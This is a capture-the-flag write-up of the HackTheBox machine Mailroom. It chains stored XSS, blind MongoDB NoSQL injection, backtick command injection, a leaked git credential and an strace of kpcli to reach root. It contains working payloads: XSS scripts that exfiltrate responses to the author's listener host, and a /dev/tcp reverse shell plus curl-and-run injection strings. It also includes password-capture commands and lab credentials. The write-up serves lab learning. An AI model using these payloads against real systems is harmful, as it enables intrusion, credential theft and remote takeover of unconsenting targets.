---
layout: post
title: "HTB: Mailroom"
subtitle: "stored XSS to blind NoSQL injection for creds, then command injection and a strace of kpcli to root"
date: 2023-08-26
tags: [htb, linux, xss, nosql-injection, command-injection]
category: writeups
kind: machine
tldr: "Stored XSS in contact.php fires an XHR against an internal staff panel, which lets me hit auth.php and brute tristan's password through MongoDB NoSQL injection. SSH in, chisel to the internal vhost, command injection in inspect.php gets www-data, a leaked .git config gives matthew, and stracing his kpcli session captures the KeePass master password for root."
---

## the box

Mailroom is a long medium Linux box and the web chain is the point. Every bug feeds the next one. Stored XSS only matters because a reviewer renders attacker content, and it only matters because that reviewer can reach an internal host I cannot. From there a NoSQL `success` flag becomes a blind oracle, a backtick the filter forgot becomes RCE inside a container, a leaked git URL becomes a second user, and an `strace` on a live `kpcli` becomes root. Target was `10.10.11.227` on this run, the box also answered as `10.10.11.209` during testing.

## recon

A full sweep plus scripts and versions:

```bash
nmap -p- --min-rate 10000 10.10.11.227
nmap -p 22,80 -sCV 10.10.11.227
```

Two ports:

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: The Mail Room
|_http-server-header: Apache/2.4.54 (Debian)
```

OpenSSH `8.2p1` is Ubuntu 20.04 (focal) while Apache `2.4.54` ships with Debian 11. A version mismatch like that is a tell for containerization, which turns out to be true at the RCE step. The app is PHP `7.4.33` behind that Apache.

The site is `mailroom.htb`, a shipping-company front. Static pages plus a contact form: `index.php`, `about.php`, `services.php`, `contact.php`. The staff page listed four names that all matter later:

```
Tristan Pitt    - Software Engineer
Matthew Conley  - System Administrator
Chris McLovin'  - Management
Vivien Perkins  - Delivery Coordinator
```

`contact.php` takes an inquiry, stores it, and returns the saved copy from a hashed path:

```
http://mailroom.htb/contact.php  ->  http://mailroom.htb/inquiries/edf1a02981408371f734d1b131654093.html
```

Content discovery with a `.php` extension confirmed `/inquiries/`, `/css/`, `/js/`, `/assets/`, `/font/`. The interesting part was vhost enumeration. Fuzzing the `Host` header found two more names:

```bash
wfuzz -u http://10.10.11.227 -H "Host: FUZZ.mailroom.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7746
```

- `git.mailroom.htb` ran **Gitea 1.18.0**. Browsing `/explore/repos` and probing usernames found a public `staffroom` repo and three accounts: `administrator`, `matthew`, `tristan`. That repo is the source code for the next host, which makes the rest of the chain whitebox.
- `staff-review-panel.mailroom.htb` returned **403 Forbidden** on `index.php`. It is only reachable from inside, which sets up the whole XSS-as-proxy idea.

I added all three to `/etc/hosts`:

```
10.10.11.227 mailroom.htb git.mailroom.htb staff-review-panel.mailroom.htb
```

Reading the `staffroom` repo, two files carry the bugs.

`auth.php` does the panel login against MongoDB:

```php
$client = new MongoDB\Client("mongodb://mongodb:27017");
...
$collection = $client->backend_panel->users;
if (isset($_POST['email']) && isset($_POST['password'])) {
  // Verify the parameters are valid
  if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
  }
  // Check if the email and password are correct
  $user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);
```

The `is_string()` check looks like a guard, but it only emits a 401 header and an error string. There is no `exit`. Execution falls through, and the array-valued input still reaches `findOne()`. That execute-after-redirect bug is what keeps a NoSQL operator injection alive past the filter. On success the server mails a 2FA link and returns `{"success":true,...}`. There is no token in the HTTP response, only in the email, which decides the shape of the attack.

`inspect.php` is the panel's inquiry viewer:

```php
$inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
$contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
```

The blocklist strips `$ < > ; | & { } ( ) [ ] ' "`, which kills most injection metacharacters, but it leaves the backtick untouched. Backtick command substitution still works, in both `inquiry_id` and `status_id`.

## foothold

The contact form renders attacker HTML when staff review it, and a quick `<b>test</b>` came back bold. A `<script src=...>` got fetched within seconds, so something automated views submissions. That is stored XSS with a live victim.

The victim's browser can reach `staff-review-panel.mailroom.htb` even though I cannot. So I used the XSS as a proxy: an `XMLHttpRequest` from inside the panel's origin context hits `auth.php`, and a second request exfiltrates the response to my listener. Same-origin is not a problem because the script runs in the page that is allowed to talk to the panel.

{% raw %}
```js
<script>const x = new XMLHttpRequest();const x1 = new XMLHttpRequest();x.open("POST", 'http://staff-review-panel.mailroom.htb/auth.php');x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");x.onload = function() {x1.open('GET', 'http://10.10.16.65:8088/?='+atob(btoa(this.responseText)));x1.send();};const email = "administrator@mailroom.htb";const data = "email[$ne]=" + encodeURIComponent(email) + "&password[$ne]=anything";x.send(data);</script>
```
{% endraw %}

Sending `email[$ne]` and `password[$ne]` as POST keys is the classic MongoDB operator-injection trick. PHP parses `name[$ne]=value` into an array, and the array reaches `findOne` as a query operator instead of a literal string:

{% raw %}
```json
{
    "email":    {"$ne": null},
    "password": {"$ne": null}
}
```
{% endraw %}

`{"$ne": null}` matches any document where the field is not null, i.e. the first user. I dropped this `<script>...</script>` straight into the contact form (the title or message field), opened a listener, and waited for the reviewer.

The exfiltrated GET confirmed the bypass. Both the `is_string` error and the real query result came back, because execution never stopped:

{% raw %}
```
{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
```
{% endraw %}

`"success":true` means the auth condition passed. But there is no cookie and no token in that response, the token only goes out by email. So I could not just log in. Instead I used `success` as a boolean oracle and brute-forced credentials with NoSQL `$regex`, character by character.

First the email. I knew the user list, and the mail enumeration leaked `...tan`, which lines up with `tristan` from the staff page. The brute-force script anchors on `"success":true` and grows the prefix one character at a time, firing one request per candidate and exfiltrating any hit:

{% raw %}
```js
async function callAuth(email) {
    const x = new XMLHttpRequest();
    x.open("POST", 'http://staff-review-panel.mailroom.htb/auth.php');
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.onload = function() {
        if (/"success":true/.test(this.responseText)) {
            forward(email);
            bfmail(chars, email);
        }
    };
    const data = `email[$regex]=.*${email}@mailroom.htb&password[$ne]=test`;
    x.send(data);
}
function forward(email) { fetch(`http://10.10.16.65:8085/?response=${email}`); }
const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%'()+, -/:;<=>@[\]_`{}~";
function bfmail(chars, email) {
    for (let i = 0; i < chars.length; i++) { callAuth(chars[i] + email); }
}
bfmail(chars, "");
```
{% endraw %}

Then the password, same idea but anchoring the `$regex` to the front of the password field for `tristan`:

{% raw %}
```js
async function SendAuth(pass) {
    const http = new XMLHttpRequest();
    http.open('POST', "http://staff-review-panel.mailroom.htb/auth.php", true);
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.onload = function() {
        if (/"success":true/.test(this.responseText)) {
            forward(pass);
            bfpass("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#%'()+, -/:;<=>@[\]_`{}~", pass)
        }
    };
    http.send("email=tristan@mailroom.htb&password[$regex]=^" + pass)
}
function forward(pass) { fetch("http://10.10.16.65:8085/?out=" + pass) }
const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#%'()+, -/:;<=>@[\]_`{}~";
function bfpass(chars, pass) {
    for (var i = 0; i < chars.length; i++) { SendAuth(pass + chars[i]) }
}
bfpass(chars, "");
```
{% endraw %}

I fed each script into `contact.php` as `<script>...</script>` and caught the leaks on a keep-alive listener (`ncat -lk -p 8085`, the `-k` flag matters so it survives the burst of requests). That recovered:

```
tristan@mailroom.htb
69trisRulez!
```

SSH took those directly:

```bash
ssh tristan@mailroom.htb   # 69trisRulez!
```

## user

tristan can read `/var/mail/tristan`, which holds the 2FA emails the panel sends. Each is a one-time login link:

```
Subject: 2FA
Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=7b235fb40a22ad1947536548e3247287
...
Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=c0bac1a1de5530aad1fe526dd334b790
```

Now I had a working second factor. The catch is the panel listens only on `127.0.0.1:80` inside the host (`netstat` showed `0.0.0.0:80` from the container side, but it is not exposed externally), so I needed to tunnel to reach it as the panel's own hostname. I used chisel with a reverse port-forward:

```bash
# attacker
sudo ./chisel server -p 8088 -reverse -v
# tristan on the box
./chisel client 10.10.16.65:8088 R:80:127.0.0.1:80
```

That maps my `127.0.0.1:80` to the box's `127.0.0.1:80`. With `127.0.0.1 staff-review-panel.mailroom.htb` in my hosts file and a fresh token from the mailbox, hitting `auth.php?token=...` set the session and redirected me to `dashboard.php`, then `inspect.php`. (A SOCKS proxy via `ssh -D 1080` plus a hosts entry works the same way if you prefer not to deploy chisel.)

`inspect.php` is the command-injection sink from recon. The filter forgets backticks, so command substitution survives. A quick local model of the exact `preg_replace` proves backticks pass through and run:

```php
<?php
$inquiryId = "`id`";
$inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $inquiryId);
$output = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
echo "$output";
?>
```

The backticks make `cat` run `id` first. To get a shell I staged a reverse-shell file and pulled it through the injection. On my box:

```bash
echo "sh -i >& /dev/tcp/10.10.16.65/7777 0>&1" > rev.sh
python3 -m http.server 9999
nc -lvnp 7777
```

Then in the `inspect.php` `inquiry_id` field, two backtick payloads in sequence, fetch and execute:

```
test`curl http://10.10.16.65:9999/rev.sh -o /tmp/rev.sh`
test`bash /tmp/rev.sh`
```

The shell came back as `www-data`, and the hostname (`bd35945feb34`) confirmed I was inside a container, not on the host. That explains the earlier OS-version mismatch.

Hunting the container webroot, `/var/www/staffroom/.git/config` leaked a credential in the remote URL:

```
[remote "origin"]
	url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[user]
	email = matthew@mailroom.htb
```

URL-decoded, `%23` is `#`, so the password is `HueLover83#`. That account is also a Linux user on the host, and `su` worked:

```bash
su - matthew   # HueLover83#
```

matthew owned the user flag.

## root

matthew's home held `personal.kdbx` (a KeePass database) and a `.kpcli-history` showing he opens it with `kpcli` interactively, on a schedule:

```
2023/04/21 03:25:14 CMD: UID=1001  PID=27741  | /usr/bin/perl /usr/bin/kpcli
2023/04/21 03:25:32 CMD: UID=1001  PID=27814  | -bash -c /usr/bin/kpcli
2023/04/21 03:25:32 CMD: UID=1001  PID=27815  | -bash -c /usr/bin/kpcli
2023/04/21 03:25:32 CMD: UID=1001  PID=27816  | /usr/bin/perl /usr/bin/kpcli
```

`kpcli` is a Perl program, so it shows up as `perl`. It runs as matthew, the same UID I now control, and `kernel.yama.ptrace_scope` was `0`, which allows tracing a same-UID process. So I could attach `strace` and watch the master password as it is typed, because the keystrokes pass through `read(0, ...)` syscalls one byte at a time.

I waited for the process and attached:

```bash
while ! pid=$(pidof perl); do sleep 1; done && strace -p "$pid" -o trace.out
# or, grabbing the pid inline:
strace -p `ps -ef | grep kpcli | awk '{ print $2 }'`
```

The trace prompted with `Enter the master password` and then leaked the input character by character, each `read` of stdin echoed as a masking `*` on stdout:

```
read(0, "!", 8192) = 1
write(1, "*", 1)    = 1
read(0, "s", 8192) = 1
write(1, "*", 1)    = 1
...
read(0, "\10", 8192) = 1   # backspace, octal \10 = ASCII 8
```

Reconstructing the bytes (and honoring the backspace, which deletes one character) gave the master password:

```
!sEcUr3p4$$w0rd9
```

I opened the database with it:

```bash
kpcli --kdb personal.kdbx
# master password: !sEcUr3p4$$w0rd9
cd Root
show -f 4
```

The root entry stored the system password:

```
root / a$gBa3!GA8
```

And `su` finished it:

```bash
su -   # a$gBa3!GA8
```

That gave root and the root flag.

## takeaway

The web chain is one bug standing on the next. Stored XSS exists only because reviewers render attacker content, and it is useful only because the victim can reach an internal host the attacker cannot, turning the XSS into an SSRF proxy. The `auth.php` `is_string()` check is worthless without an `exit`, that execute-after-redirect bug is the whole NoSQL injection, and the `success` flag is a perfectly good blind oracle even with the 2FA token kept out of the response. The `inspect.php` blocklist that forgets backticks is the same mistake as no blocklist at all. On root, the lesson is plain: a secret typed into a running process you can `ptrace` is not a secret, and storing the root password in a vault you open under a debuggable UID just hands it over.
